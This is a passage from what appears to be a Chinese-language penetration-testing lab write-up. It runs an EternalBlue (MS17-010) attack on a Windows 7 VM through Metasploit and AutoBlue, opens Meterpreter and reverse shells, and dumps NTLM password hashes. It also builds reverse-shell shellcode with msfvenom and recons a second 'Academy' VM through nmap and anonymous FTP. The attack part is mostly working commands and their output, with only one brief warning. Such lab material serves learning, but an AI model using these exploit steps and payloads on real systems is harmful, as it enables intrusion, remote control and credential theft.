exploit/windows/smb/smb_doublepulsar_rce</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **use 0**</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic</span><br><span class="line">                                             s/using-metasploit.html</span><br><span class="line">   RPORT          445              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use <span class="keyword">for</span> authentication. Only affects Windows S</span><br><span class="line">                                             erver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote architecture matches exploit Target. Only affects Windows Serve</span><br><span class="line">                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote OS matches exploit Target. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **<span class="built_in">set</span> rhosts 192.168.19.139**</span><br><span class="line">rhosts =&gt; 192.168.19.139</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **check** </span><br><span class="line"></span><br><span class="line">[*] 192.168.19.139:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.19.139:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.19.139:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.19.139:445 - The target is vulnerable.</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **<span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp**</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.19.139   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic</span><br><span class="line">                                             s/using-metasploit.html</span><br><span class="line">   RPORT          445              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use <span class="keyword">for</span> authentication. Only affects Windows S</span><br><span class="line">                                             erver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote architecture matches exploit Target. Only affects Windows Serve</span><br><span class="line">                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote OS matches exploit Target. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **<span class="built_in">set</span> lhost eth0  <span class="comment">#設定IP也可以寫網卡名稱**</span></span><br><span class="line">lhost =&gt; 192.168.19.130</span><br></pre></td></tr></table></figure>
<ul>
<li>通過check也確認了目標機器的漏洞</li>
<li>成功利用該漏洞進行遠程登入</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **run**</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.139:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.19.139:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.19.139:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.19.139:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.19.139:445 - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.19.139:445 - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.19.139:445 - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] 192.168.19.139:445 - CORE raw buffer dump (38 bytes)</span><br><span class="line">[*] 192.168.19.139:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.19.139:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service </span><br><span class="line">[*] 192.168.19.139:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          </span><br><span class="line">[+] 192.168.19.139:445 - Target <span class="built_in">arch</span> selected valid <span class="keyword">for</span> <span class="built_in">arch</span> indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.19.139:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.19.139:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.19.139:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.19.139:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.19.139:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.19.139:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.19.139:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.19.139:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.19.139:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.19.139:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.19.139:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (201798 bytes) to 192.168.19.139</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.19.130:4444 -&gt; 192.168.19.139:49162) at 2024-02-14 21:39:34 -0500</span><br><span class="line">[+] 192.168.19.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.19.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.19.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; **hashdump** </span><br><span class="line">**Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::**</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::</span><br><span class="line">**user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  換個攻擊方式，使用以下payload試試</p>
<p>  <a target="_blank" rel="noopener" href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# git <span class="built_in">clone</span> https://github.com/3ndG4me/AutoBlue-MS17-010</span><br><span class="line">Cloning into <span class="string">&#x27;AutoBlue-MS17-010&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 145, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (69/69), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (30/30), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 145 (delta 52), reused 43 (delta 39), pack-reused 76</span><br><span class="line">Receiving objects: 100% (145/145), 105.75 KiB | 993.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (86/86), <span class="keyword">done</span>.</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# <span class="built_in">cd</span> AutoBlue-MS17-010 </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# **pip install -r requirements.txt** </span><br><span class="line">Requirement already satisfied: impacket <span class="keyword">in</span> /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.11.0)</span><br><span class="line">Requirement already satisfied: dsinternals <span class="keyword">in</span> /usr/lib/python3/dist-packages (from impacket-&gt;-r requirements.txt (line 1)) (1.2.4)</span><br><span class="line">WARNING: Running pip as the <span class="string">&#x27;root&#x27;</span> user can result <span class="keyword">in</span> broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# python eternal_checker.py 192.168.19.139</span><br><span class="line">[*] Target OS: Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">[!] The target is not patched</span><br><span class="line">=== Testing named pipes ===</span><br><span class="line">[*] Done</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# <span class="built_in">cd</span> shellcode        </span><br><span class="line">                                                                                                                                                                                                                                                                                                                          </span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]</span><br><span class="line">└─# ./shell_prep.sh</span><br><span class="line">                 _.-;;-._</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|   ||   |</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|_.-;;-._|</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|   ||   |</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|_.-<span class="string">&#x27;&#x27;</span>-._|   </span><br><span class="line">Eternal Blue Windows Shellcode Compiler</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s compile them windoos shellcodezzz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Compiling x64 kernel shellcode</span></span><br><span class="line"><span class="string">Compiling x86 kernel shellcode</span></span><br><span class="line"><span class="string">kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)</span></span><br><span class="line"><span class="string">Y</span></span><br><span class="line"><span class="string">LHOST for reverse connection:</span></span><br><span class="line"><span class="string">**192.168.19.130**</span></span><br><span class="line"><span class="string">LPORT you want x64 to listen on:</span></span><br><span class="line"><span class="string">**9999**</span></span><br><span class="line"><span class="string">LPORT you want x86 to listen on:</span></span><br><span class="line"><span class="string">**2222**</span></span><br><span class="line"><span class="string">Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Type 0 to generate a staged payload or 1 to generate a stageless payload</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">Generating x64 cmd shell (staged)...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.19.130 LPORT=9999**</span></span><br><span class="line"><span class="string">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></span><br><span class="line"><span class="string">[-] No arch selected, selecting arch: x64 from the payload</span></span><br><span class="line"><span class="string">No encoder specified, outputting raw payload</span></span><br><span class="line"><span class="string">Payload size: 511 bytes</span></span><br><span class="line"><span class="string">Saved as: **sc_x64_msf.bin**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Generating x86 cmd shell (staged)...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=192.168.19.130 LPORT=2222**</span></span><br><span class="line"><span class="string">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></span><br><span class="line"><span class="string">[-] No arch selected, selecting arch: x86 from the payload</span></span><br><span class="line"><span class="string">No encoder specified, outputting raw payload</span></span><br><span class="line"><span class="string">Payload size: 375 bytes</span></span><br><span class="line"><span class="string">Saved as: sc_x86_msf.bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MERGING SHELLCODE WOOOO!!!</span></span><br><span class="line"><span class="string">DONE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]</span></span><br><span class="line"><span class="string">└─# cd ..          </span></span><br><span class="line"><span class="string">                                                                                                                                                             </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span></span><br><span class="line"><span class="string">└─# ./listener_prep.sh</span></span><br><span class="line"><span class="string">  __</span></span><br><span class="line"><span class="string">  /,-</span></span><br><span class="line"><span class="string">  ||)</span></span><br><span class="line"><span class="string">  \\_, )</span></span><br><span class="line"><span class="string">   `--&#x27;</span></span><br><span class="line">Eternal Blue Metasploit Listener</span><br><span class="line"></span><br><span class="line">LHOST <span class="keyword">for</span> reverse connection:</span><br><span class="line">**192.168.19.130**</span><br><span class="line">LPORT <span class="keyword">for</span> x64 reverse connection:</span><br><span class="line">**9999**</span><br><span class="line">LPORT <span class="keyword">for</span> x86 reverse connection:</span><br><span class="line">**2222**</span><br><span class="line">Enter 0 <span class="keyword">for</span> meterpreter shell or 1 <span class="keyword">for</span> regular cmd shell:</span><br><span class="line">**1**</span><br><span class="line">Type 0 <span class="keyword">if</span> this is a staged payload or 1 <span class="keyword">if</span> it is <span class="keyword">for</span> a stageless payload: 0</span><br><span class="line">Starting listener (staged)...</span><br><span class="line">Starting postgresql (via systemctl): postgresql.service.</span><br><span class="line">Metasploit tip: To save all commands executed since start up to a file, use the </span><br><span class="line">makerc <span class="built_in">command</span></span><br><span class="line">                                                  </span><br><span class="line"> ______________________________________</span><br><span class="line">/ it looks like you<span class="string">&#x27;re trying to run a \                                                                                                                     </span></span><br><span class="line"><span class="string">\ module                               /                                                                                                                     </span></span><br><span class="line"><span class="string"> --------------------------------------                                                                                                                      </span></span><br><span class="line"><span class="string"> \                                                                                                                                                           </span></span><br><span class="line"><span class="string">  \                                                                                                                                                          </span></span><br><span class="line"><span class="string">     __                                                                                                                                                      </span></span><br><span class="line"><span class="string">    /  \                                                                                                                                                     </span></span><br><span class="line"><span class="string">    |  |                                                                                                                                                     </span></span><br><span class="line"><span class="string">    @  @                                                                                                                                                     </span></span><br><span class="line"><span class="string">    |  |                                                                                                                                                     </span></span><br><span class="line"><span class="string">    || |/                                                                                                                                                    </span></span><br><span class="line"><span class="string">    || ||                                                                                                                                                    </span></span><br><span class="line"><span class="string">    |\_/|                                                                                                                                                    </span></span><br><span class="line"><span class="string">    \___/                                                                                                                                                    </span></span><br><span class="line"><span class="string">                                                                                                                                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v6.3.55-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span></span><br><span class="line"><span class="string">+ -- --=[ 9 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Metasploit Documentation: https://docs.metasploit.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Processing config.rc for ERB directives.</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; use exploit/multi/handler</span></span><br><span class="line"><span class="string">[*] Using configured payload generic/shell_reverse_tcp</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set PAYLOAD windows/x64/shell/reverse_tcp</span></span><br><span class="line"><span class="string">PAYLOAD =&gt; windows/x64/shell/reverse_tcp</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set LHOST 192.168.19.130</span></span><br><span class="line"><span class="string">LHOST =&gt; 192.168.19.130</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set LPORT 9999</span></span><br><span class="line"><span class="string">LPORT =&gt; 9999</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set ExitOnSession false</span></span><br><span class="line"><span class="string">ExitOnSession =&gt; false</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set EXITFUNC thread</span></span><br><span class="line"><span class="string">EXITFUNC =&gt; thread</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; exploit -j</span></span><br><span class="line"><span class="string">[*] Exploit running as background job 0.</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set PAYLOAD windows/shell/reverse_tcp</span></span><br><span class="line"><span class="string">PAYLOAD =&gt; windows/shell/reverse_tcp</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set LPORT 2222</span></span><br><span class="line"><span class="string">LPORT =&gt; 2222</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; exploit -j</span></span><br><span class="line"><span class="string">[*] Exploit running as background job 1.</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.19.130:9999 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.19.130:2222 </span></span><br><span class="line"><span class="string">msf6 exploit(multi/handler) &gt;</span></span><br></pre></td></tr></table></figure>
<p>  當全部設定好然後運行指令進行攻擊後會看到受害機…</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# python3 eternalblue_exploit7.py 192.168.19.139 shellcode/sc_all.bin</span><br><span class="line">shellcode size: 2307</span><br><span class="line">numGroomConn: 13</span><br><span class="line">Target OS: Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">SMB1 session setup allocate nonpaged pool success</span><br><span class="line">SMB1 session setup allocate nonpaged pool success</span><br><span class="line">good response status: INVALID_PARAMETER</span><br></pre></td></tr></table></figure>
<p>  <img src="/img/privilege_Untitled.png" alt="Untitled"></p>
<ul>
<li>該攻擊會讓受害機器無法正常運作，不要隨意進行攻擊!</li>
</ul>
</li>
</ul>
<h3 id="Set-Up-Academy"><a href="#Set-Up-Academy" class="headerlink" title="Set Up - Academy"></a><strong>Set Up - Academy</strong></h3><p>login &gt; root</p>
<p>passwd &gt; tcm</p>
<p>原本在嘗試用 <code>kali</code> 進行 <code>arp-scan -l</code> 時，無法找到目標機器的網路位址</p>
<p>在看了這台機器ip後，它沒有被分配到IP位置</p>
<p><img src="/img/privilege_Untitled_1.png" alt="Untitled"></p>
<p>該機器網路是靜態模式的網卡，不主動向伺服器獲取IP地址，在目標機器上執行該指令</p>
<p>需要使用 <code>dhclient</code> 動態獲取或釋放IP位置</p>
<ul>
<li><code>dhclient -r</code> &gt; 釋放IP</li>
<li><code>dhclient</code> &gt; 取得IP</li>
<li><code>dhclient eth0</code> &gt; 續訂主乙太網路設備的動態分配IP位址</li>
</ul>
<p>但重開機要再重新下一次指令</p>
<p><img src="/img/privilege_Untitled_2.png" alt="Untitled"></p>
<p>ip : 192.168.19.141 &gt; 這樣kali已經能arp-scan -l 找到這台機器了</p>
<p>按照慣例一樣先找port有開的服務</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nmap -T4 -A -p-** 192.168.19.141</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 11:20 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.141</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">**21/tcp open  ftp     vsftpd 3.0.3**</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.19.130</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt</span><br><span class="line">**22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)**</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)</span><br><span class="line">|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)</span><br><span class="line">|_  256 99:9c:39:11:<span class="built_in">dd</span>:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)</span><br><span class="line">**80/tcp open  http    Apache httpd 2.4.38 ((Debian))**</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">MAC Address: 00:0C:29:AC:4E:32 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 5.0 - 5.5</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.44 ms 192.168.19.141</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.22 seconds</span><br></pre></td></tr></table></figure>

<p>看到ssh &gt; 嘗試像root的使用者名稱或密碼進行登入</p>
<ul>
<li><p>弱密碼</p>
</li>
<li><p>看看client端是否能檢測到你再進行的登入動作，尤其是在爆破時</p>
</li>
<li><p>除了被偵測到，是否有被抵擋發送大量請求的行為</p>
</li>
<li><p>有沒有留下log登入紀錄</p>
</li>
<li><p>默認Apache網頁所帶來的危害</p>
<p>  <img src="/img/privilege_Untitled_3.png" alt="Untitled"></p>
<ul>
<li>發生在web跟api應用程式的攻擊技術</li>
<li>資料蒐集的一環</li>
<li>提供有關web伺服器的訊息</li>
<li>存在隱藏目錄位置</li>
<li>用於識別伺服器的漏洞並規劃攻擊</li>
<li>列舉伺服器上執行的應用程式和服務</li>
<li>識別web伺服器設定中的弱點</li>
<li>取得並對應用程式、資料庫、內部網路的存取權限</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                   危害</span><br><span class="line">                    |</span><br><span class="line">     ---------------------------------</span><br><span class="line">    |               |                 |</span><br><span class="line">   敏感           安全漏洞           隱私泄露</span><br><span class="line">  資訊外洩       揭示系統漏洞       個人資料曝光</span><br><span class="line">    |               |                 |</span><br><span class="line"> 未授權訪問      破壞數據完整性       用戶追蹤</span><br><span class="line">  敏感文件      網站被入侵者操控     第三方跟蹤</span><br><span class="line">    |               |</span><br><span class="line">登錄信息泄露    安全漏洞被利用</span><br><span class="line">                    |</span><br><span class="line">              網站崩潰或服務中斷</span><br></pre></td></tr></table></figure>
</li>
<li><p>ftp在nmap中發現可以用Anonymous進行登入</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ftp 192.168.19.141**</span><br><span class="line">Connected to 192.168.19.141.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.19.141:kali): **Anonymous**</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; **<span class="built_in">ls</span>**</span><br><span class="line">229 Entering Extended Passive Mode (|||36525|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; **get note.txt**</span><br><span class="line"><span class="built_in">local</span>: note.txt remote: note.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||54067|)</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> note.txt (776 bytes).</span><br><span class="line">100% |*********************************************************************************|   776        1.36 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">776 bytes received <span class="keyword">in</span> 00:00 (428.14 KiB/s)</span><br></pre></td></tr></table></figure>

<ul>
<li>也許這note.txt是存在於apache網頁後的某個目錄中，只是我們並不知道，但是通過ftp發現了這個檔案</li>
<li>儘管檔案不是直接放在apache網頁目錄後，也可以從中取得一些訊息<ul>
<li>apache 2.4.38</li>
<li>debian</li>
</ul>
</li>
</ul>
<p><img src="/img/privilege_Untitled_4.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **<span class="built_in">cat</span> note.txt** </span><br><span class="line">Hello Heath !</span><br><span class="line">Grimmie has setup the <span class="built_in">test</span> website <span class="keyword">for</span> the new academy.</span><br><span class="line">I told him not to use the same password everywhere, he will change it ASAP.</span><br><span class="line"></span><br><span class="line">I couldn<span class="string">&#x27;t create a user via the admin panel, so instead I inserted **directly into the database** with the following command:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES</span></span><br><span class="line"><span class="string">(&#x27;</span>10201321<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span>cd73502828457d15655bbd7a63fb0bc8<span class="string">&#x27;, &#x27;</span>Rum Ham<span class="string">&#x27;, &#x27;</span>777777<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span>7.60<span class="string">&#x27;, &#x27;</span>2021-05-29 14:36:56<span 